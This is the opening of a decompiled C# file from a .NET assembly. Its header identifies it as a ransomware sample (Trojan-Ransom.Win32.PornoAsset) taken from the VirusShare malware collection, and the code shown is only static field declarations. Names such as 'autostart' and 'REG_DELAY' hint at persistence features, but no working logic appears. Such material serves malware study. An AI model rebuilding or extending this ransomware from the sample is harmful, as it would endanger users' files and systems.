// Decompiled with JetBrains decompiler
// Type: <Module>
// Assembly: SessionManager, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5F4E431A-1C9D-475F-9E1E-350D94C63940
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00050-msil\Trojan-Ransom.Win32.PornoAsset.cxpz-d6be5407c2324a9731d25eaa8218435f4b6fd17a.exe

using \u003CCppImplementationDetails\u003E;
using \u003CCrtImplementationDetails\u003E;
using System;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Runtime.ConstrainedExecution;
using System.Runtime.InteropServices;
using System.Security;
using System.Threading;

internal class \u003CModule\u003E
{
  internal static \u0024ArrayType\u0024\u0024\u0024BY00Q6MPBXXZ \u003FA0x250abb45\u002E__xc_mp_z;
  [FixedAddressValueType]
  internal static int \u003FUninitialized\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2HA;
  internal static __FnPtr<void ()> \u003FA0x250abb45\u002E\u003FUninitialized\u0024initializer\u0024\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2P6MXXZA;
  internal static \u0024ArrayType\u0024\u0024\u0024BY00Q6MPBXXZ \u003FA0x250abb45\u002E__xi_vt_a;
  [FixedAddressValueType]
  internal static Progress.State \u003FInitializedPerAppDomain\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2W4State\u0040Progress\u00402\u0040A;
  internal static __FnPtr<void ()> \u003FA0x250abb45\u002E\u003FInitializedPerAppDomain\u0024initializer\u0024\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2P6MXXZA;
  [FixedAddressValueType]
  internal static bool \u003FIsDefaultDomain\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2_NA;
  internal static __FnPtr<void ()> \u003FA0x250abb45\u002E\u003FIsDefaultDomain\u0024initializer\u0024\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2P6MXXZA;
  internal static \u0024ArrayType\u0024\u0024\u0024BY00Q6MPBXXZ \u003FA0x250abb45\u002E__xc_ma_a;
  [FixedAddressValueType]
  internal static Progress.State \u003FInitializedNative\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2W4State\u0040Progress\u00402\u0040A;
  internal static __FnPtr<void ()> \u003FA0x250abb45\u002E\u003FInitializedNative\u0024initializer\u0024\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2P6MXXZA;
  [FixedAddressValueType]
  internal static int \u003FInitialized\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2HA;
  internal static __FnPtr<void ()> \u003FA0x250abb45\u002E\u003FInitialized\u0024initializer\u0024\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2P6MXXZA;
  internal static \u0024ArrayType\u0024\u0024\u0024BY00Q6MPBXXZ \u003FA0x250abb45\u002E__xc_ma_z;
  [FixedAddressValueType]
  internal static Progress.State \u003FInitializedVtables\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2W4State\u0040Progress\u00402\u0040A;
  internal static __FnPtr<void ()> \u003FA0x250abb45\u002E\u003FInitializedVtables\u0024initializer\u0024\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2P6MXXZA;
  internal static \u0024ArrayType\u0024\u0024\u0024BY00Q6MPBXXZ \u003FA0x250abb45\u002E__xi_vt_z;
  [FixedAddressValueType]
  internal static Progress.State \u003FInitializedPerProcess\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2W4State\u0040Progress\u00402\u0040A;
  internal static __FnPtr<void ()> \u003FA0x250abb45\u002E\u003FInitializedPerProcess\u0024initializer\u0024\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2P6MXXZA;
  internal static bool \u003FInitializedPerProcess\u0040DefaultDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u00402_NA;
  internal static bool \u003FEntered\u0040DefaultDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u00402_NA;
  internal static bool \u003FInitializedNative\u0040DefaultDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u00402_NA;
  internal static int \u003FCount\u0040AllDomains\u0040\u003CCrtImplementationDetails\u003E\u0040\u00402HA;
  internal static uint \u003FProcessAttach\u0040NativeDll\u0040\u003CCrtImplementationDetails\u003E\u0040\u00400IB;
  internal static uint \u003FThreadAttach\u0040NativeDll\u0040\u003CCrtImplementationDetails\u003E\u0040\u00400IB;
  internal static TriBool.State \u003FhasNative\u0040DefaultDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u00400W4State\u0040TriBool\u00402\u0040A;
  internal static uint \u003FProcessDetach\u0040NativeDll\u0040\u003CCrtImplementationDetails\u003E\u0040\u00400IB;
  internal static uint \u003FThreadDetach\u0040NativeDll\u0040\u003CCrtImplementationDetails\u003E\u0040\u00400IB;
  internal static uint \u003FProcessVerifier\u0040NativeDll\u0040\u003CCrtImplementationDetails\u003E\u0040\u00400IB;
  internal static TriBool.State \u003FhasPerProcess\u0040DefaultDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u00400W4State\u0040TriBool\u00402\u0040A;
  internal static bool \u003FInitializedNativeFromCCTOR\u0040DefaultDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u00402_NA;
  internal static \u0024ArrayType\u0024\u0024\u0024BY00Q6MPBXXZ \u003FA0x250abb45\u002E__xc_mp_a;
  public static unsafe int** __unep\u0040\u003FDoNothing\u0040DefaultDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024FCGJPAX\u0040Z;
  public static unsafe int** __unep\u0040\u003F_UninitializeDefaultDomain\u0040LanguageSupport\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024FCGJPAX\u0040Z;
  [FixedAddressValueType]
  internal static uint __exit_list_size_app_domain;
  [FixedAddressValueType]
  internal static unsafe __FnPtr<void ()>* __onexitbegin_app_domain;
  internal static uint \u003FA0x11773762\u002E__exit_list_size;
  [FixedAddressValueType]
  internal static unsafe __FnPtr<void ()>* __onexitend_app_domain;
  internal static unsafe __FnPtr<void ()>* \u003FA0x11773762\u002E__onexitbegin_m;
  internal static unsafe __FnPtr<void ()>* \u003FA0x11773762\u002E__onexitend_m;
  [FixedAddressValueType]
  internal static unsafe void* \u003F_lock\u0040AtExitLock\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q0PAXA;
  [FixedAddressValueType]
  internal static int \u003F_ref_count\u0040AtExitLock\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q0HA;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BI\u0040\u0024\u0024CBD \u003FA0x1755acad\u002Eunnamed\u002Dglobal\u002D0;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BJ\u0040\u0024\u0024CBD \u003FA0x1755acad\u002Eunnamed\u002Dglobal\u002D1;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BAA\u0040UADVINFO\u0040\u0040 advinfo;
  internal static \u0024ArrayType\u0024\u0024\u0024BY01\u0024\u0024CBD \u003FA0xc43c8710\u002Eunnamed\u002Dglobal\u002D0;
  internal static \u0024ArrayType\u0024\u0024\u0024BY01\u0024\u0024CBD \u003FA0xc43c8710\u002Eunnamed\u002Dglobal\u002D1;
  internal static \u0024ArrayType\u0024\u0024\u0024BY1IA\u0040IA\u0040D log;
  public static unsafe int** __unep\u0040\u003FHandlerRoutine\u0040\u0040\u0024\u0024FYGHK\u0040Z;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0O\u0040\u0024\u0024CB_W \u003FA0xb9b13019\u002Eunnamed\u002Dglobal\u002D0;
  internal static \u0024ArrayType\u0024\u0024\u0024BY02\u0024\u0024CBD \u003FA0xb9b13019\u002Eunnamed\u002Dglobal\u002D1;
  internal static int REG_DELAY;
  internal static \u0024ArrayType\u0024\u0024\u0024BY02UAUTOSTART\u0040\u0040 autostart;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0P\u0040\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D0;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BA\u0040\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D1;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BA\u0040\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D2;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BB\u0040\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D3;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BB\u0040\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D4;
  internal static \u0024ArrayType\u0024\u0024\u0024BY03\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D5;
  internal static \u0024ArrayType\u0024\u0024\u0024BY04\u0024\u0024CB_W \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D6;
  internal static \u0024ArrayType\u0024\u0024\u0024BY05\u0024\u0024CB_W \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D7;
  internal static \u0024ArrayType\u0024\u0024\u0024BY00\u0024\u0024CB_W \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D8;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BM\u0040\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D9;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0DC\u0040\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D10;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BE\u0040\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D11;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0CA\u0040\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D12;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0O\u0040\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D13;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BL\u0040\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D14;
  internal static \u0024ArrayType\u0024\u0024\u0024BY03\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D15;
  internal static \u0024ArrayType\u0024\u0024\u0024BY02\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D16;
  internal static \u0024ArrayType\u0024\u0024\u0024BY01\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D17;
  internal static \u0024ArrayType\u0024\u0024\u0024BY01\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D18;
  internal static \u0024ArrayType\u0024\u0024\u0024BY01\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D19;
  internal static \u0024ArrayType\u0024\u0024\u0024BY04\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D20;
  internal static \u0024ArrayType\u0024\u0024\u0024BY09\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D21;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0N\u0040\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D22;
  internal static \u0024ArrayType\u0024\u0024\u0024BY03\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D23;
  internal static \u0024ArrayType\u0024\u0024\u0024BY03\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D24;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0O\u0040\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D25;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0N\u0040\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D26;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0N\u0040\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D27;
  internal static \u0024ArrayType\u0024\u0024\u0024BY03\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D28;
  internal static \u0024ArrayType\u0024\u0024\u0024BY01\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D29;
  internal static \u0024ArrayType\u0024\u0024\u0024BY03\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D30;
  internal static \u0024ArrayType\u0024\u0024\u0024BY09\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D31;
  internal static \u0024ArrayType\u0024\u0024\u0024BY04\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D32;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BM\u0040\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D33;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BA\u0040\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D34;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0N\u0040\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D35;
  internal static \u0024ArrayType\u0024\u0024\u0024BY04\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D36;
  internal static \u0024ArrayType\u0024\u0024\u0024BY05\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D37;
  internal static \u0024ArrayType\u0024\u0024\u0024BY04\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D38;
  internal static \u0024ArrayType\u0024\u0024\u0024BY04\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D39;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BN\u0040\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D40;
  internal static \u0024ArrayType\u0024\u0024\u0024BY04\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D41;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BA\u0040\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D42;
  internal static \u0024ArrayType\u0024\u0024\u0024BY03\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D43;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BM\u0040\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D44;
  internal static \u0024ArrayType\u0024\u0024\u0024BY07\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D45;
  internal static \u0024ArrayType\u0024\u0024\u0024BY06\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D46;
  internal static \u0024ArrayType\u0024\u0024\u0024BY03\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D47;
  internal static \u0024ArrayType\u0024\u0024\u0024BY07\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D48;
  internal static \u0024ArrayType\u0024\u0024\u0024BY06\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D49;
  internal static \u0024ArrayType\u0024\u0024\u0024BY06\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D50;
  internal static \u0024ArrayType\u0024\u0024\u0024BY01\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D51;
  internal static \u0024ArrayType\u0024\u0024\u0024BY09\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D52;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BK\u0040\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D53;
  internal static \u0024ArrayType\u0024\u0024\u0024BY05\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D54;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BH\u0040\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D55;
  internal static \u0024ArrayType\u0024\u0024\u0024BY05\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D56;
  internal static \u0024ArrayType\u0024\u0024\u0024BY01\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D57;
  internal static \u0024ArrayType\u0024\u0024\u0024BY01\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D58;
  internal static \u0024ArrayType\u0024\u0024\u0024BY01\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D59;
  internal static \u0024ArrayType\u0024\u0024\u0024BY01\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D60;
  internal static \u0024ArrayType\u0024\u0024\u0024BY03\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D61;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0CH\u0040\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D62;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0CL\u0040\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D63;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0CG\u0040\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D64;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0CH\u0040\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D65;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0CL\u0040\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D66;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0CG\u0040\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D67;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BL\u0040\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D68;
  internal static \u0024ArrayType\u0024\u0024\u0024BY03\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D69;
  internal static \u0024ArrayType\u0024\u0024\u0024BY02\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D70;
  internal static \u0024ArrayType\u0024\u0024\u0024BY04\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D71;
  internal static \u0024ArrayType\u0024\u0024\u0024BY03\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D72;
  internal static \u0024ArrayType\u0024\u0024\u0024BY03\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D73;
  internal static \u0024ArrayType\u0024\u0024\u0024BY05\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D74;
  internal static \u0024ArrayType\u0024\u0024\u0024BY05\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D75;
  internal static \u0024ArrayType\u0024\u0024\u0024BY08\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D76;
  internal static \u0024ArrayType\u0024\u0024\u0024BY07\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D77;
  internal static \u0024ArrayType\u0024\u0024\u0024BY05\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D78;
  internal static \u0024ArrayType\u0024\u0024\u0024BY05\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D79;
  internal static \u0024ArrayType\u0024\u0024\u0024BY01\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D80;
  internal static \u0024ArrayType\u0024\u0024\u0024BY02\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D81;
  internal static \u0024ArrayType\u0024\u0024\u0024BY01\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D82;
  internal static \u0024ArrayType\u0024\u0024\u0024BY01\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D83;
  internal static \u0024ArrayType\u0024\u0024\u0024BY06\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D84;
  internal static \u0024ArrayType\u0024\u0024\u0024BY02\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D85;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BM\u0040\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D86;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0CH\u0040\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D87;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0CH\u0040\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D88;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BM\u0040\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D89;
  internal static \u0024ArrayType\u0024\u0024\u0024BY07\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D90;
  internal static \u0024ArrayType\u0024\u0024\u0024BY03\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D91;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BF\u0040\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D92;
  internal static \u0024ArrayType\u0024\u0024\u0024BY09\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D93;
  internal static \u0024ArrayType\u0024\u0024\u0024BY01\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D94;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BF\u0040\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D95;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0L\u0040\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D96;
  internal static \u0024ArrayType\u0024\u0024\u0024BY02\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D97;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BG\u0040\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D98;
  internal static \u0024ArrayType\u0024\u0024\u0024BY04\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D99;
  internal static \u0024ArrayType\u0024\u0024\u0024BY01\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D100;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0L\u0040\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D101;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0O\u0040\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D102;
  internal static \u0024ArrayType\u0024\u0024\u0024BY06\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D103;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BK\u0040\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D104;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0CB\u0040\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D105;
  internal static \u0024ArrayType\u0024\u0024\u0024BY07\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D106;
  internal static \u0024ArrayType\u0024\u0024\u0024BY02\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D107;
  internal static \u0024ArrayType\u0024\u0024\u0024BY07\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D108;
  internal static \u0024ArrayType\u0024\u0024\u0024BY02\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D109;
  internal static \u0024ArrayType\u0024\u0024\u0024BY09\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D110;
  internal static \u0024ArrayType\u0024\u0024\u0024BY03\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D111;
  internal static \u0024ArrayType\u0024\u0024\u0024BY08\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D112;
  internal static \u0024ArrayType\u0024\u0024\u0024BY03\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D113;
  internal static \u0024ArrayType\u0024\u0024\u0024BY03\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D114;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BB\u0040\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D115;
  internal static \u0024ArrayType\u0024\u0024\u0024BY07\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D116;
  internal static \u0024ArrayType\u0024\u0024\u0024BY06\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D117;
  internal static \u0024ArrayType\u0024\u0024\u0024BY07\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D118;
  internal static \u0024ArrayType\u0024\u0024\u0024BY02\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D119;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BF\u0040\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D120;
  internal static \u0024ArrayType\u0024\u0024\u0024BY08\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D121;
  internal static \u0024ArrayType\u0024\u0024\u0024BY04\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D122;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BP\u0040\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D123;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0CH\u0040\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D124;
  internal static \u0024ArrayType\u0024\u0024\u0024BY08\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D125;
  internal static \u0024ArrayType\u0024\u0024\u0024BY04\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D126;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BP\u0040\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D127;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0CH\u0040\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D128;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0CH\u0040\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D129;
  internal static \u0024ArrayType\u0024\u0024\u0024BY04\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D130;
  internal static \u0024ArrayType\u0024\u0024\u0024BY01\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D131;
  internal static \u0024ArrayType\u0024\u0024\u0024BY09\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D132;
  internal static \u0024ArrayType\u0024\u0024\u0024BY04\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D133;
  internal static \u0024ArrayType\u0024\u0024\u0024BY01\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D134;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0N\u0040\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D135;
  internal static \u0024ArrayType\u0024\u0024\u0024BY06\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D136;
  internal static \u0024ArrayType\u0024\u0024\u0024BY02\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D137;
  internal static \u0024ArrayType\u0024\u0024\u0024BY01\u0024\u0024CBD \u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D138;
